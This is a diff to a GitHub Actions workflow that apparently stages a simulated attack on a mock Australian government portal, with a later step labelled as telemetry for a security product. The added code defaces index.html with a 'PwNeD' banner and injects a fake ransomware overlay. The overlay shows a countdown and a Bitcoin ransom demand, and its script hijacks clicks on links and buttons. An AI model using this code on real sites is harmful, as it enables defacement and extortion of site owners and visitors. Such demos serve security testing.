@@ -53,8 +53,55 @@ jobs:
             APP_DIR="/opt/mock-aus-gov-portal"
             
             echo "==== 1. DEFACING WEBSITE ===="
-            # Injecting the banner directly into the HTML
+            # 1a. Injecting the banner directly into the HTML
             sudo sed -i "s|<body>|<body><div id='hacked-banner' style='background: red; color: white; text-align: center; padding: 20px; font-size: 30px; font-family: monospace; font-weight: bold; position: fixed; top: 0; width: 100%; z-index: 9999; animation: blink 1s infinite;'>PwNeD by ${{ github.event.inputs.attacker_name }}</div><style>@keyframes blink { 50% { opacity: 0.5; } }</style>|g" $APP_DIR/public/index.html
+            
+            # 1b. Injecting the Ransomware UI overlay
+            cat << 'RANSOM' > /tmp/ransom.html
+            <div id="ransom-modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:10000; color:#0f0; font-family:monospace; flex-direction:column; align-items:center; justify-content:center;">
+              <h1 style="color:red; font-size:3rem; margin-bottom:10px; text-shadow: 0 0 10px red;">!!! SYSTEM ENCRYPTED !!!</h1>
+              <div style="font-size:5rem; margin:20px 0; font-weight:bold; color:white; text-shadow: 0 0 10px white;" id="ransom-timer">48:00:00</div>
+              <p style="font-size:1.5rem; text-align:center; max-width:800px; line-height: 1.6;">
+                To restore, send 4 Bitcoins: <br>
+                <strong style="color:#fff; background:#222; padding:10px; border:1px solid #555; display:inline-block; margin-top:15px;">3FkoGYFh6QtjnNCPLQjIxcjgkeUR23A65nEJq09</strong>
+                <br><br>Hurry hurry now :)
+              </p>
+              <button onclick="document.getElementById('ransom-modal').style.display='none'" style="margin-top:40px; padding:10px 20px; background:red; color:white; border:2px solid darkred; cursor:pointer; font-size:1.2rem; font-family:monospace; font-weight:bold;">I WILL PAY (Close Window)</button>
+            </div>
+            <script>
+              (function(){
+                var endTime = new Date().getTime() + (48 * 60 * 60 * 1000);
+                setInterval(function(){
+                  var distance = endTime - new Date().getTime();
+                  if (distance < 0) return;
+                  var h = Math.floor(distance / (1000 * 60 * 60));
+                  var m = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                  var s = Math.floor((distance % (1000 * 60)) / 1000);
+                  document.getElementById('ransom-timer').innerText = (h<10?'0':'')+h + ':' + (m<10?'0':'')+m + ':' + (s<10?'0':'')+s;
+                }, 1000);
+                document.addEventListener('click', function(e){
+                  var t = e.target;
+                  if (t.innerText === 'I WILL PAY (Close Window)') return;
+                  var isClickable = false;
+                  while(t && t !== document.body) {
+                    if(t.tagName==='BUTTON' || t.tagName==='A' || t.onclick || (t.classList && t.classList.contains('nav-item'))) { 
+                      isClickable = true; 
+                      break; 
+                    }
+                    t = t.parentNode;
+                  }
+                  if(isClickable) {
+                    e.preventDefault(); e.stopPropagation();
+                    document.getElementById('ransom-modal').style.display = 'flex';
+                  }
+                }, true);
+              })();
+            </script>
+            RANSOM
+            
+            # Insert the ransomware html just before the closing </body> tag
+            sudo sed -i -e '/<\/body>/e cat /tmp/ransom.html' $APP_DIR/public/index.html
+            sudo rm /tmp/ransom.html
             
             echo "==== 2. SIMULATING TELEMETRY FOR WIZ ===="
             
